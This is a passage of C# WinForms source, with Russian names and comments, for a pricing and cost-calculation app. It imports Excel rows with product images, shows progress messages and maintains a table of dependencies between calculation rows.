                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[3].Value = str;
                            }
                            if (cCnt == 4)//цена
                            {
                                if (str == null) { ohibki++; dataGridView_расчёт_2[5, dataGridView_расчёт_2.NewRowIndex - 1].Style.BackColor = Color.FromArgb(255, 255, 20, 20); }
                                else
                                {
                                    string new_ctena = str.Replace(".", ",");
                                    decimal newDecimal;
                                    bool isDecimal = Decimal.TryParse(new_ctena, out newDecimal);
                                    if (newDecimal < 1)
                                    { dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[5].Value = newDecimal.ToString("#######0.00"); }
                                    else
                                    { dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[5].Value = newDecimal.ToString("########.00"); }
                                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[5].Value.ToString() == "0,00")
                                    { ohibki++; dataGridView_расчёт_2[5, dataGridView_расчёт_2.NewRowIndex - 1].Style.BackColor = Color.FromArgb(255, 255, 20, 20); }
                                }

                                //получить имя


                                // получаем выбранный файл
                                string filename = open_dialog.FileName;
                                System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя

                                char[] MyChar = { '.', 'x', 'l', 's', 'x' };
                                string Directory1 = obj.Name.TrimEnd(MyChar); // путь к папке   

                                char[] charArr = (Directory1 + ".xlsx").ToCharArray();
                                //   string ddd = filename.TrimEnd(charArr);
                                string pyt_k_file = filename.TrimEnd(charArr);
                                //   put_k_arhiv = Directory1 + "//" + name_file + ".DAH";




                                try //пробуем загрузить фото 
                                {
                                    string NamesImageNev = dataGridView_расчёт_2.Rows[rCnt - 1].Cells[3].Value.ToString();
                                    NamesImageNev = NamesImageNev.Replace("\\", "№");
                                    NamesImageNev = NamesImageNev.Replace("/", "%");
                                    bool tryfile_jpeg = File.Exists(pyt_k_file + NamesImageNev + ".jpeg");
                                    bool tryfile_bmp = File.Exists(pyt_k_file + NamesImageNev + ".bmp");
                                    bool tryfile_png = File.Exists(pyt_k_file + NamesImageNev + ".png");

                                    string exeForm = ".jpg";
                                    if (tryfile_jpeg == true) { exeForm = ".jpeg"; }
                                    if (tryfile_bmp == true) { exeForm = ".bmp"; }
                                    if (tryfile_png == true) { exeForm = ".png"; }



                                    System.Drawing.Image img;
                                    using (var bmpTemp = new Bitmap(pyt_k_file + NamesImageNev + exeForm))
                                    {
                                        img = new Bitmap(bmpTemp);
                                    }
                                    if (img.Size.Height > 401 || img.Size.Width > 401)
                                    {
                                        label_consol_2.Text = "В меня пытаются воткнуть здоровенню картинку!. Эй!.";
                                        /*
                                        bool vibor_nada = false;
                                        bool vibor_hago = false;
                                        int vibor_col = 0;
                                        */



                                        vibor_col++;
                                        DialogResult result = DialogResult.Yes;
                                        if (vibor_nada == false)
                                        {
                                            result = MessageBox.Show(
                                             "Рисунок с названием: " + NamesImageNev + ".jpg превышает размер 400х400 пиксилей!\nИмеет размеры: " + img.Size.Height.ToString() + " высоты и " + img.Size.Width.ToString() + " ширины. \n\nЕсли нажмёте Да- перенесу как есть.\nЕсли нажмешь Нет - сконвертирую и уменьшу.\nЕсли нажмешь Отмена- ничего не вставлю в эту ячейку.",
                                             "Сообщение",
                                             MessageBoxButtons.YesNoCancel,
                                             MessageBoxIcon.Information);
                                        }



                                        if (vibor_col == 4)
                                        {
                                            DialogResult result2 = MessageBox.Show("Не вспотел? Сделать так для всех фото?", "Че то много их тут!", MessageBoxButtons.YesNo, MessageBoxIcon.Stop);
                                            if (result2 == DialogResult.Yes) { vibor_nada = true; if (result == DialogResult.Yes) { vibor_hago = 1; } else if (result == DialogResult.No) { vibor_hago = 2; } else { vibor_hago = 3; } }
                                        }

                                        if (vibor_nada == false)
                                        {
                                            if (result == DialogResult.Yes)
                                            {
                                                using (var bmpTemp = new Bitmap(pyt_k_file + NamesImageNev + exeForm))
                                                {
                                                    img = new Bitmap(bmpTemp);
                                                }
                                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[4].Value = img;
                                            }
                                            else if
                                                   (result == DialogResult.No)
                                            {
                                                using (var bmpTemp = new Bitmap(pyt_k_file + NamesImageNev + exeForm))
                                                {
                                                    img = new Bitmap(bmpTemp);
                                                }
                                                if (img.Width > 401) { img = new Bitmap(img, new Size(400, (400 * img.Height) / img.Width)); }

                                                else { img = new Bitmap(img, new Size((400 * img.Width) / img.Height, 400)); }

                                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[4].Value = img;

                                            }
                                        }
                                        else
                                        {
                                            if (vibor_hago == 1)
                                            {
                                                using (var bmpTemp = new Bitmap(pyt_k_file + NamesImageNev + exeForm))
                                                {
                                                    img = new Bitmap(bmpTemp);
                                                }
                                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[4].Value = img;

                                            }
                                            else if (vibor_hago == 2)
                                            {
                                                using (var bmpTemp = new Bitmap(pyt_k_file + NamesImageNev + exeForm))
                                                {
                                                    img = new Bitmap(bmpTemp);
                                                }
                                                if (img.Width > 401) { img = new Bitmap(img, new Size(400, (400 * img.Height) / img.Width)); }

                                                else { img = new Bitmap(img, new Size((400 * img.Width) / img.Height, 400)); }

                                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[4].Value = img;

                                            }
                                            else if (vibor_hago == 3)
                                            {

                                            }
                                        }
                                    }
                                    else
                                    {
                                        dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex - 1].Cells[4].Value = img;
                                    }
                                }
                                catch { }
                            }
                            label_consol_2.Text = "Ковыряю файл:" + open_dialog.FileName + " строка:" + rCnt + " столбец:" + cCnt + "   Всего строк:" + rw;
                        }
                        catch { }
                    }
                }
                xlWorkBook.Close(true, null, null);
                xlApp.Quit();
                Marshal.ReleaseComObject(xlWorkSheet);
                Marshal.ReleaseComObject(xlWorkBook);
                Marshal.ReleaseComObject(xlApp);
                if (ohibki == 0)
                {
                    label_consol_2.Text = "Готово! Нет ошибок!";
                }
                else
                {
                    label_consol_2.Text = "Готово! Но есть: " + ohibki.ToString() + " ошибок! Я пометила их красным!";
                }


            }
            else { label_consol_2.Text = "Передумал всталять.. Ну и ладно. а то у тя и так мало оперативки для меня!"; }
            dialog_mess("Stop");
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;

        }


        private void справкаПоПрайсуToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form Form_справка_о_базе = new автор();

            Form_справка_о_базе.ShowDialog();
        }

        private void справкаПоРасчетуToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(@"rez\\II\\EB1300beta.exe");

        }

        private void справкаПоТаблицеЗависимостиToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Form h = new телик();
            h.Show();
            справкаПоТаблицеЗависимостиToolStripMenuItem.Enabled = false;

        }

        public void скрыть_активнность(object sender, EventArgs e)
        {
            справкаПоТаблицеЗависимостиToolStripMenuItem.Enabled = true;


        }


        #endregion меню



        #region окошко сообщения (второй поток)
        Form mes_hist = new Form();
        System.Windows.Forms.Label info01 = new System.Windows.Forms.Label();
        Thread checkConnection1;
        private void dialog_mess(string mess)
        {
            if (mess == "Start") { checkConnection1 = new Thread(() => новый_поток()); checkConnection1.Start(); }//запускам поток.           
            if (mess == "Stop") { try { info01.Invoke((MethodInvoker)delegate { info01.Text = ""; }); mes_hist.Invoke((MethodInvoker)delegate { mes_hist.Close(); }); checkConnection1.Abort(); } catch { } }
            if (mess != "Close" && mess != "Start") { try { info01.Invoke((MethodInvoker)delegate { info01.Text = mess; }); } catch { } }
        }
        private void новый_поток()
        {
            if (mes_hist.Visible == false)
            {
                info01.AutoSize = false;
                info01.Location = new System.Drawing.Point(3, 3);
                info01.Size = new System.Drawing.Size(100, 40);
                info01.Font = new System.Drawing.Font("Trebuchet MS", 9, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
                //  info01.BackColor = Color.Wheat;//фон
                info01.ForeColor = Color.Blue;
                mes_hist.FormBorderStyle = FormBorderStyle.None;
                mes_hist.TopMost = true;
                mes_hist.Size = new Size(110, 50);
                mes_hist.Controls.Add(info01);
                mes_hist.StartPosition = FormStartPosition.Manual;//край слево монитора
                if (Baza == true) mes_hist.Location = new System.Drawing.Point(this.Location.X + 17, this.Location.Y + 259); //в расчёте 
                else mes_hist.Location = new System.Drawing.Point(this.Location.X + 18, this.Location.Y + 214);//в базе 
                mes_hist.MinimumSize = mes_hist.Size;
                mes_hist.MaximumSize = mes_hist.Size;
                mes_hist.MaximizeBox = false;
                mes_hist.ShowInTaskbar = false;
                mes_hist.ShowDialog();
            }
        }
        #endregion






        int matem_raz = 0;
        Boolean otclehivat_polzovatelia = true;
        Boolean zapret_lohn = false;
        bool ykazat_stroki = false;

        private void dataGridView_муляж_CellValidated(object sender, DataGridViewCellEventArgs e)
        {
            for (int x = 0; x < dataGridView_муляж.Rows.Count - 1; x++)
            {
                if (dataGridView_муляж.Rows[x].Cells[3].Value == null)
                {
                    dataGridView_муляж.Rows[x].Cells[3].Value = "x";
                }
            }

            if (dataGridView_муляж.CurrentCell.ColumnIndex == 1 || dataGridView_муляж.CurrentCell.ColumnIndex == 4)
            {
                try
                {
                    string dsd = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[dataGridView_муляж.CurrentCell.ColumnIndex].Value.ToString();
                    dsd = dsd.Replace(".", ",");
                    dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[dataGridView_муляж.CurrentCell.ColumnIndex].Value = dsd;
                }
                catch
                {
                }
            }
            kl++;
            if (kl == 3)
            {
                if (dataGridView_расчёт_2.CurrentCell.RowIndex == techRow)
                {
                    for (int d = 0; d < dataGridView_муляж.Rows.Count - 1; d++)
                    {
                        try
                        {
                            if (dataGridView_муляж.Rows[d].Cells[2].Value.ToString() == "!Выберите наименование!")
                            {
                                duble_art_art.Enabled = true;

                                dataGridView_муляж.Rows[d].Cells[2].Value = null; dataGridView_муляж.Rows[d].Cells[2].Style.BackColor = Color.Empty;
                            }
                        }
                        catch { }
                    }
                }
                else
                {
                    for (int d = 0; d < dataGridView_муляж.Rows.Count - 1; d++)
                    {
                        string thel = null;
                        try
                        {
                            thel = dataGridView_муляж.Rows[d].Cells[2].Value.ToString();
                        }
                        catch { }
                        if (thel == "!Выберите наименивание!")
                        {
                            ykazat_stroki = true;
                            string new_Art = null;
                            string new_id_artq = null;
                            try { new_Art = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[9].Value.ToString(); } catch { }
                            if (new_Art == null)
                            {
                                Random rnd = new Random();
                                //Получить случайное число (в диапазоне от 0 до 10)
                                int new_id_art = rnd.Next(0, 1000000);
                                for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                                {
                                    string id = null;
                                    try { id = dataGridView_расчёт_2.Rows[x].Cells[9].Value.ToString(); } catch { }
                                    if (id != null && id == new_id_art.ToString()) { new_id_art = rnd.Next(0, 1000000); x = 0; }
                                }
                                dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[5].Value = new_id_art.ToString();
                                dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[9].Value = new_id_art.ToString();
                            }
                            else
                            {
                                dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[5].Value = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[9].Value.ToString();
                            }
                            dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[2].Value;
                            for (int a = dataGridView_зависимость.Rows.Count - 1; a >= 0; a--)
                            {
                                string asad = null;
                                try { asad = dataGridView_зависимость.Rows[a].Cells[4].Value.ToString(); } catch { }
                                if (asad != null)
                                {
                                    if (asad == dataGridView_расчёт_2.Rows[techRow].Cells[8].Value.ToString())
                                    { dataGridView_зависимость.Rows.RemoveAt(a); }
                                }
                            }
                            for (int a = 0; a < dataGridView_муляж.Rows.Count - 1; a++)
                            {
                                dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[0].Value = dataGridView_муляж.Rows[a].Cells[1].Value;
                                dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[1].Value = dataGridView_муляж.Rows[a].Cells[2].Value;
                                dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[2].Value = dataGridView_муляж.Rows[a].Cells[3].Value;
                                dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[3].Value = dataGridView_муляж.Rows[a].Cells[4].Value;
                                dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[4].Value = dataGridView_расчёт_2.Rows[techRow].Cells[8].Value;
                                dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[5].Value = dataGridView_муляж.Rows[a].Cells[5].Value;
                                dataGridView_зависимость.Rows.Add();
                            }
                        }
                    }
                    kl++;
                }
            }
            //3
            otclehivat_polzovatelia = false;
            if (zapret_lohn == false)
            {

                int nomber = 1; // автономерация при изменение в таблице, нужно для расчирения таблицы. 
                if (dataGridView_муляж.Rows.Count > 1)
                {
                    for (int a = 0; a < dataGridView_муляж.Rows.Count - 1; a++)
                    {
                        dataGridView_муляж.Rows[a].Cells[0].Value = nomber.ToString();
                        nomber++;
                    }
                }
                string id_tech = null;
                try { id_tech = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }
                if (id_tech != null)
                {
                    for (int a = dataGridView_зависимость.Rows.Count - 1; a >= 0; a--)
                    {
                        string asad = null;
                        try { asad = dataGridView_зависимость.Rows[a].Cells[4].Value.ToString(); } catch { }
                        if (asad != null)
                        {
                            if (dataGridView_зависимость.Rows[a].Cells[4].Value.ToString() == id_tech)
                            { dataGridView_зависимость.Rows.RemoveAt(a); }
                        }
                    }
                    for (int a = 0; a < dataGridView_муляж.Rows.Count - 1; a++)
                    {    //тут ошибка! вылетает исключение 
                        try { dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[0].Value = dataGridView_муляж.Rows[a].Cells[1].Value; } catch { }
                        try { dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[1].Value = dataGridView_муляж.Rows[a].Cells[2].Value; } catch { }
                        try { dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[2].Value = dataGridView_муляж.Rows[a].Cells[3].Value; } catch { }
                        try { dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[3].Value = dataGridView_муляж.Rows[a].Cells[4].Value; } catch { }
                        try { dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[4].Value = id_tech; } catch { }
                        try { dataGridView_зависимость.Rows[dataGridView_зависимость.Rows.Count - 1].Cells[5].Value = dataGridView_муляж.Rows[a].Cells[5].Value; } catch { }
                        dataGridView_зависимость.Rows.Add();
                    }
                }
            }
            //узнаем сколько раз надо посчитать!
            if (dataGridView_зависимость.Rows.Count > 0)
            {
                for (int i = 0; i < dataGridView_зависимость.Rows.Count; i++)
                {
                    string l = null;
                    try
                    {
                        l = dataGridView_зависимость.Rows[i].Cells[5].Value.ToString();
                        matem_raz++;
                    }
                    catch { }
                }
            }



            matem_raz = 0;
            //узнаем сколько раз надо посчитать!
            if (dataGridView_зависимость.Rows.Count > 0)
            {
                for (int i = 0; i < dataGridView_зависимость.Rows.Count; i++)
                {
                    string l = null;
                    try
                    {
                        l = dataGridView_зависимость.Rows[i].Cells[5].Value.ToString();
                        matem_raz++;
                    }
                    catch { }
                }
            }


            zapret_lohn = false;
            otclehivat_polzovatelia = true;


            математика.Enabled = true;// посчитаем

        }

        private void button_new_zavisim_Click(object sender, EventArgs e)
        {
            string id_tech = null;
            try { id_tech = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }

            if (id_tech == null)
            {
                //Создание объекта для генерации чисел
                Random rnd = new Random();
                //Получить случайное число (в диапазоне от 0 до 10)
                int new_id = rnd.Next(0, 1000000);
                for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                {
                    string id = null;
                    try { id = dataGridView_расчёт_2.Rows[x].Cells[8].Value.ToString(); } catch { }
                    if (id != null && id == new_id.ToString()) { new_id = rnd.Next(0, 1000000); x = 0; }
                }
                try { dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value = new_id.ToString(); } catch { }
                dataGridView_муляж.Visible = true;
                groupBox7.Visible = true;
                try
                { dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[0].Style.BackColor = Color.Wheat; }
                catch { }
                razhet_label.Visible = true;//требуется расчёт
            }
        }

        private void button_del_zavis_Click(object sender, EventArgs e)
        {
            try
            {



                otclehivat_polzovatelia = false;
                zapret_lohn = false;

                string dsd1 = null; // значение в выделенной ячейке

                string число_муляж = null;
                string наименование_муляж = null;
                string знак_муляж = null;
                string множитель_муляж = null;
                string id_art_муляж = null;

                string id_tabl_razh = null;

                try { число_муляж = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[1].Value.ToString(); } catch { }
                try { наименование_муляж = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value.ToString(); } catch { }
                try { знак_муляж = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[3].Value.ToString(); } catch { }
                try { множитель_муляж = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[4].Value.ToString(); } catch { }
                try { id_art_муляж = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[5].Value.ToString(); } catch { }

                try { id_tabl_razh = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }
                int цел_муляж = dataGridView_муляж.CurrentCell.RowIndex;
                for (int x = 0; x < dataGridView_зависимость.RowCount - 1; x++)
                {
                    string Чис = null;
                    string Арт = null;
                    string знак = null;
                    string Множитель = null;
                    string ID = null;
                    string ID_Art = null;
                    try { Чис = dataGridView_зависимость.Rows[x].Cells[0].Value.ToString(); } catch { }
                    try { Арт = dataGridView_зависимость.Rows[x].Cells[1].Value.ToString(); ; } catch { }
                    try { знак = dataGridView_зависимость.Rows[x].Cells[2].Value.ToString(); ; } catch { }
                    try { Множитель = dataGridView_зависимость.Rows[x].Cells[3].Value.ToString(); ; } catch { }
                    try { ID = dataGridView_зависимость.Rows[x].Cells[4].Value.ToString(); ; } catch { }
                    try { ID_Art = dataGridView_зависимость.Rows[x].Cells[5].Value.ToString(); ; } catch { }

                    if (Чис == число_муляж && Арт == наименование_муляж && знак == знак_муляж && Множитель == множитель_муляж && id_art_муляж == ID_Art && ID == id_tabl_razh)
                    {
                        dataGridView_зависимость.Rows.RemoveAt(x);

                    }
                }
                dataGridView_муляж.Rows.RemoveAt(цел_муляж);



                matem_raz = 0;
                //узнаем сколько раз надо посчитать!
                if (dataGridView_зависимость.Rows.Count > 0)
                {
                    for (int i = 0; i < dataGridView_зависимость.Rows.Count; i++)
                    {
                        string l = null;
                        try
                        {
                            l = dataGridView_зависимость.Rows[i].Cells[5].Value.ToString();
                            matem_raz++;
                        }
                        catch { }
                    }
                }

                otclehivat_polzovatelia = true;
                математика.Enabled = true; //пробую  
                label_consol_2.Text = "Удалено условие" + (dataGridView_муляж.CurrentCell.RowIndex + 1).ToString() + "         Всего строк условий: " + dataGridView_муляж.NewRowIndex.ToString();
            }
            catch
            {
                label_consol_2.Text = "Нечего удалять в условиях.";
            }
        }



        #region удалить строку в расчётке
        //удалить строку в расчётке, Значит переменную делаем тру потом запускам поток сохранения, в конце его выполнения запускается процес удаления тут! Потом меняется переменная на фелс
        bool del_razhet_sobyt = false;
        private void button_del_razhet_Click(object sender, EventArgs e)
        {
            del_razhet_sobyt = true;
            сохранить_для_востоновления();               
        }
        void del_razhet()
        {   
            otclehivat_polzovatelia = false;
            try
            {
                int ad = dataGridView_расчёт_2.CurrentCell.RowIndex;
                if (dataGridView_расчёт_2.Rows[ad].Cells[8].Value != null)
                {
                    string id = dataGridView_расчёт_2.Rows[ad].Cells[8].Value.ToString();
                    for (int a = dataGridView_зависимость.Rows.Count - 1; a >= 0; a--)
                    {
                        try
                        {
                            if (dataGridView_зависимость.Rows[a].Cells[4].Value.ToString() == id)
                            {
                                dataGridView_зависимость.Rows.RemoveAt(a);
                            }
                        }
                        catch { }
                    }
                }
                dataGridView_расчёт_2.Rows.RemoveAt(ad);
                ///
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value != null)
                {
                    dataGridView_муляж.Rows.Clear();
                    string dsd = null;
                    try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }
                    if (dsd != null)
                    {
                        int nomber = 1;
                        for (int a = 0; a < dataGridView_зависимость.Rows.Count - 1; a++)
                        {
                            if (dsd == dataGridView_зависимость.Rows[a].Cells[4].Value.ToString())
                            {
                                dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[a].Cells[0].Value, dataGridView_зависимость.Rows[a].Cells[1].Value, dataGridView_зависимость.Rows[a].Cells[2].Value, dataGridView_зависимость.Rows[a].Cells[3].Value);
                                nomber++;
                            }
                        }
                    }
                }
                else
                {
                    dataGridView_муляж.Visible = false;
                    //это избавиться от цвета при выделении зависимости от артикула
                    for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                    {
                        try
                        {
                            if (dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor == Color.LightGreen) { dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor = Color.Empty; }
                        }
                        catch { }
                    }
                }
                label_consol_2.Text = "Удалена строка: " + (dataGridView_расчёт_2.CurrentCell.RowIndex + 1).ToString() + "         Всего строк строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                otclehivat_polzovatelia = true;
                razhet_label.Visible = true;//требуется расчёт
            }
            catch
            {
                otclehivat_polzovatelia = true;
                label_consol_2.Text = "Нечего удалять в расчётке.";
            }
            del_razhet_sobyt = false;
        }

        #endregion удалить строку в расчётке






        private void button_del_zavisim_Click(object sender, EventArgs e)
        {
            otclehivat_polzovatelia = false;
            try
            {
                int ad = dataGridView_расчёт_2.CurrentCell.RowIndex;
                if (dataGridView_расчёт_2.Rows[ad].Cells[0].Style.BackColor == Color.Wheat && dataGridView_расчёт_2.Rows[ad].Cells[8].Value != null)
                {
                    string id = dataGridView_расчёт_2.Rows[ad].Cells[8].Value.ToString();
                    for (int a = dataGridView_зависимость.Rows.Count - 1; a >= 0; a--)
                    {
                        try
                        {
                            if (dataGridView_зависимость.Rows[a].Cells[4].Value.ToString() == id)
                            {
                                dataGridView_зависимость.Rows.RemoveAt(a);
                            }
                        }
                        catch { }
                    }
                }
                dataGridView_расчёт_2.Rows[ad].Cells[0].Style.BackColor = Color.Empty;
                dataGridView_муляж.Visible = false;
                dataGridView_расчёт_2.Rows[ad].Cells[8].Value = null;
                //это избавиться от выделеия цвета в зависимости от артикула
                for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                {
                    try
                    {
                        if (dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor == Color.LightGreen)
                        {
                            dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor = Color.Empty;
                            // Вот тут вопрос? А нужно ли менять артикул в памяти 
                        }
                    }
                    catch { }
                }

                //  dataGridView_расчёт_2.Rows.RemoveAt(ad);
                ///
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8] != null)
                {
                    dataGridView_муляж.Rows.Clear();
                    string dsd = null;
                    try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }
                    if (dsd != null)
                    {
                        int nomber = 1;
                        for (int a = 0; a < dataGridView_зависимость.Rows.Count - 1; a++)
                        {
                            if (dsd == dataGridView_зависимость.Rows[a].Cells[4].Value.ToString())
                            {
                                dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[a].Cells[0].Value, dataGridView_зависимость.Rows[a].Cells[1].Value, dataGridView_зависимость.Rows[a].Cells[2].Value, dataGridView_зависимость.Rows[a].Cells[3].Value);
                                nomber++;
                            }
                        }
                    }
                }////
                label_consol_2.Text = "Удалена строка: " + (dataGridView_расчёт_2.CurrentCell.RowIndex + 1).ToString() + "         Всего строк строк: " + dataGridView_расчёт_2.NewRowIndex.ToString();
                otclehivat_polzovatelia = true;
                razhet_label.Visible = true;//требуется расчёт
            }
            catch
            {
                otclehivat_polzovatelia = true;
                label_consol_2.Text = "Нечего удалять в расчётке.";
            }

        }


        private void dataGridView_муляж_CellEnter(object sender, DataGridViewCellEventArgs e)
        {

            //пробуем впихнуть артикул
            string dsd1 = null; // значение в выделенной ячейке
            try
            {
                dsd1 = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[dataGridView_муляж.CurrentCell.ColumnIndex].Value.ToString();
            }
            catch { }
            if (dsd1 == null && dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value == null && dataGridView_муляж.CurrentCell.ColumnIndex == 2)
            {
                if (dataGridView_муляж.CurrentCell.RowIndex < dataGridView_муляж.Rows.Count - 1)
                {
                    dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[1].Value = null;
                    dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Style.BackColor = Color.LightGreen;
                    dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value = "!Выберите наименивание!";
                    techRow = dataGridView_расчёт_2.CurrentCell.RowIndex;
                    techColumn = dataGridView_расчёт_2.CurrentCell.ColumnIndex;
                    zapret_lohn = true; kl = 0;
                }
            }
            else
            {

                for (int d = 0; d < dataGridView_муляж.Rows.Count - 1; d++)
                {
                    try
                    {
                        if (dataGridView_муляж.Rows[d].Cells[2].Value.ToString() == "!Выберите наименивание!")
                        {
                            duble_art_art.Enabled = true;
                            dataGridView_муляж.Rows[d].Cells[2].Value = null; dataGridView_муляж.Rows[d].Cells[2].Style.BackColor = Color.Empty;
                        }
                    }
                    catch { }
                }
            }
            //подкрасим артикулы в расчетке


            for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
            {                //проверка наличае          
                try
                {
                    if (dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor == Color.LightGreen)
                    {
                        dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor = Color.Empty;
                    }
                }
                catch { }
            }

            //ПРОВЕРКА!!
            //подрежим лишнее если нет артикула удалим id_art.
            for (int x = 0; x < dataGridView_муляж.Rows.Count - 1; x++)
            {
                try { if (dataGridView_муляж.Rows[x].Cells[2].Value == null) { dataGridView_муляж.Rows[x].Cells[5].Value = null; ; } } catch { }
                try
                {
                    if (dataGridView_муляж.Rows[x].Cells[2].Value == null && dataGridView_муляж.Rows[x].Cells[1].Value == null)
                    { dataGridView_муляж.Rows[x].Cells[1].Style.BackColor = Color.Red; dataGridView_муляж.Rows[x].Cells[2].Style.BackColor = Color.Red; }
                    else if (dataGridView_муляж.Rows[x].Cells[2].Style.BackColor == Color.Red && dataGridView_муляж.Rows[x].Cells[1].Style.BackColor == Color.Red)
                    { dataGridView_муляж.Rows[x].Cells[1].Style.BackColor = Color.Empty; dataGridView_муляж.Rows[x].Cells[2].Style.BackColor = Color.Empty; }
                }
                catch { }
                if (dataGridView_муляж.Rows[x].Cells[4].Value == null) { dataGridView_муляж.Rows[x].Cells[4].Style.BackColor = Color.Red; } else { dataGridView_муляж.Rows[x].Cells[4].Style.BackColor = Color.Empty; }
            }
            string vale = null;
            try { vale = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value.ToString(); } catch { }
            if (vale != null && vale != "!Выберите наименивание!")
            {
                string vale_id = null;
                try { vale_id = dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[5].Value.ToString(); } catch { }
                if (vale_id != null)
                {
                    bool err33 = true; //авария, если есть в зависимости ссылка на стрку, а строку удалили,то эта переманная сздаст аварию. 
                    for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                    {
                        string art_id = null;
                        try { art_id = dataGridView_расчёт_2.Rows[x].Cells[9].Value.ToString(); } catch { }

                        if (art_id != null && vale_id == art_id)
                        {

                            dataGridView_расчёт_2.Rows[x].Cells[3].Style.BackColor = Color.LightGreen;
                            dataGridView_муляж.Rows[dataGridView_муляж.CurrentCell.RowIndex].Cells[2].Value = dataGridView_расчёт_2.Rows[x].Cells[2].Value;
                            // вопрос! нужно ли обнавлять артикул в зависимостях надо
                            for (int s = 0; s < dataGridView_зависимость.Rows.Count - 1; s++)
                            {
                                string gfg = null;
                                try { gfg = dataGridView_зависимость.Rows[s].Cells[5].Value.ToString(); } catch { }
                                if (gfg == art_id)
                                {
